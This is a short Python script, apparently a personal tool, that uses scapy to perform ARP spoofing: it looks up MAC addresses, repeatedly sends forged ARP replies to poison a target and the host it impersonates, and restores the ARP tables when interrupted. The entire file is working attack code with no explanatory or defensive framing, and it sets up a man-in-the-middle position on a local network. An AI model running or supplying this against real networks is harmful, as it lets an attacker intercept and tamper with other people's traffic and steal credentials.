import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    src_dest = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast = src_dest/arp_request
    answered_list = scapy.srp(broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def send_packet(target_ip, spoof_ip):
    mac_address = get_mac(target_ip)
    packet = scapy.ARP(pdst=target_ip, hwdst=mac_address, op=2, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def remap(dest_ip, src_ip):
    mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(pdst=dest_ip, hwdst=mac, op=2, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

def spoof_arp(target_ip, spoof_ip):
    send_packet_value = 0
    try:
        while True:
            send_packet(target_ip, spoof_ip)
            send_packet(spoof_ip, target_ip)
            send_packet_value += 2
            print(f"\rPacket Sended: {send_packet_value}", end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print("[+] Quiting ... \nRestoring ARP...")
        remap(target_ip, spoof_ip)
        remap(spoof_ip, target_ip)
